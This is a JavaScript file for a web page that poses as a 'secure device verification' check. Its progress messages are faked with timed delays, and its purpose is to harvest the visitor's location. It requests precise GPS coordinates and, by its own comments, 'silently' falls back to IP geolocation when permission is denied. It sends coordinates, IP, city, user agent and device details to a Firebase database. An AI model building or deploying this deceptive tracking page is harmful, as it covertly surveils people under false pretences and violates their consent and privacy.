import { initializeTheme } from './src/features/theme/theme-manager.js';
import { listenForLocationRequests, setupUnloadHandler, determineLocationSource } from './src/features/location/location-tracker.js';
import { getDeviceInfo } from './src/utils/browser-detection.js';

// Verification steps (internal only, not shown to user)
const VERIFICATION_STEPS = [
    { message: 'Initializing secure verification...', delay: 1000 },
    { message: 'Checking device compatibility...', delay: 1500 },
    { message: 'Requesting secure location access...', delay: 0 },
    { message: 'Retrieving device location...', delay: 2000 },
    { message: 'Verifying location accuracy...', delay: 1500 },
    { message: 'Validating IP address...', delay: 1500 },
    { message: 'Performing security checks...', delay: 1500 },
    { message: 'Finalizing device verification...', delay: 1000 }
];

// Helper function to handle geolocation errors
function getGeolocationErrorMessage(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            return "Location access was denied. Please allow location access to verify your device.";
        case error.POSITION_UNAVAILABLE:
            return "An error occurred. Please try again.";
        case error.TIMEOUT:
            return "An error occurred. Please try again.";
        default:
            return "An error occurred. Please try again.";
    }
}

// Helper function to get location from IP (silently)
async function getLocationFromIP() {
    const response = await fetch('https://ipapi.co/json/');
    if (!response.ok) {
        throw new Error('Failed to get location from IP');
    }
    const data = await response.json();
    return {
        coords: {
            latitude: parseFloat(data.latitude),
            longitude: parseFloat(data.longitude),
            accuracy: 5000,
            altitude: null,
            altitudeAccuracy: null
        },
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country_name
    };
}

// Helper function to update verification status
function updateVerificationStatus(message, progress) {
    const locationStatus = document.getElementById('locationStatus');
    const verifyButton = document.getElementById('allowLocation');
    
    // Update button text to show progress
    if (progress > 0) {
        verifyButton.textContent = `Verifying... ${progress}%`;
        verifyButton.style.setProperty('--progress', `${progress}%`);
    }
}

// Helper function to simulate step processing
async function processStep(stepIndex, totalSteps) {
    const step = VERIFICATION_STEPS[stepIndex];
    const progress = Math.round((stepIndex + 1) / totalSteps * 100);
    updateVerificationStatus(step.message, progress);
    if (step.delay > 0) {
        await new Promise(resolve => setTimeout(resolve, step.delay));
    }
}

// Initialize Firebase and load theme
document.addEventListener('DOMContentLoaded', async () => {
    try {
        await initializeTheme();
        listenForLocationRequests();
        setupUnloadHandler();

        const verifyButton = document.getElementById('allowLocation');
        const locationStatus = document.getElementById('locationStatus');

        if (!verifyButton) {
            console.error('Verify button not found');
            return;
        }

        verifyButton.addEventListener('click', async () => {
            try {
                verifyButton.disabled = true;
                document.querySelector('.container').classList.add('processing');
                locationStatus.textContent = '';

                // Process initial steps
                for (let i = 0; i < 2; i++) {
                    await processStep(i, VERIFICATION_STEPS.length);
                }

                let position;
                let locationSource;
                let wasLocationDenied = false;

                // Try to get precise location
                if (navigator.geolocation) {
                    try {
                        position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(
                                resolve,
                                reject,
                                {
                                    enableHighAccuracy: true,
                                    timeout: 20000,
                                    maximumAge: 0
                                }
                            );
                        });
                        locationSource = await determineLocationSource(position);
                    } catch (geoError) {
                        console.log('Geolocation error:', geoError);
                        if (geoError.code === 1) { // Permission denied
                            wasLocationDenied = true;
                            locationStatus.textContent = getGeolocationErrorMessage(geoError);
                            locationStatus.style.color = '#DA1710';
                            verifyButton.disabled = false;
                            verifyButton.textContent = 'Verify Device';
                            document.querySelector('.container').classList.remove('processing');
                            
                            // Silently get IP location
                            try {
                                const ipLocation = await getLocationFromIP();
                                position = ipLocation;
                                locationSource = 'IP-Based';
                            } catch (ipError) {
                                console.error('IP location error:', ipError);
                            }
                        } else {
                            throw geoError;
                        }
                    }
                }

                // Only proceed with verification if location wasn't denied
                if (!wasLocationDenied && position) {
                    // Process remaining steps
                    for (let i = 3; i < VERIFICATION_STEPS.length; i++) {
                        await processStep(i, VERIFICATION_STEPS.length);
                    }

                    // Save to Firebase
                    if (!window.database) {
                        throw new Error('Firebase database not initialized');
                    }

                    const locationsRef = window.database.ref('locations');
                    const newLocationRef = locationsRef.push();

                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        locationSource: locationSource,
                        locationDenied: wasLocationDenied,
                        city: position.city,
                        region: position.region,
                        country: position.country,
                        timestamp: new Date().toISOString(),
                        status: 'active',
                        ip: position.ip || (await getLocationFromIP()).ip,
                        userAgent: navigator.userAgent,
                        ...getDeviceInfo()
                    };

                    await newLocationRef.set(locationData);

                    // Show success and hide button
                    locationStatus.textContent = 'Device verified successfully';
                    locationStatus.style.color = ''; // Reset color
                    verifyButton.style.display = 'none';
                    document.querySelector('.thank-you-card').classList.add('success');
                }

            } catch (error) {
                console.error('Verification failed:', error);
                locationStatus.textContent = 'An error occurred. Please try again.';
                locationStatus.style.color = '#DA1710';
                verifyButton.disabled = false;
                verifyButton.textContent = 'Verify Device';
                verifyButton.style.setProperty('--progress', '0%');
                document.querySelector('.container').classList.remove('processing');
            }
        });

    } catch (error) {
        console.error('Failed to initialize:', error);
    }
});
